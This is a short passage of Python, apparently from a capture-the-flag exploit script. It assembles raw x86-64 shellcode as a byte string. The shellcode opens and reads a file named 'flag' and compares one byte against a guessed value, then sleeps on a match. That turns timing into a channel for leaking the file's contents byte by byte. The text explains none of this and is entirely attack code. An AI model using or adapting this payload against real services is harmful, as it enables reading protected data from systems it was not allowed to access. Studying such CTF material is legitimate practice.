...
print("index")
print(value)
shellcode=b"\x31\xC0\xFF\xC0\xFF\xC0\x31\xF6\x48\xC7\xC3\x66\x6C\x61\x67\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x31\xC0\x48\x89\xE6\xBA\x20\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\x83\xC6"+value+b"\x40\x8A\xBE\x00\x00\x00\x00\x40\x80\xFF"+index_val+b"\x75\x1E\x4D\x31\xE4\x41\x54\x48\xC7\xC7\x01\x00\x00\x00\x57\xB8\x23\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x90"
print(shellcode)
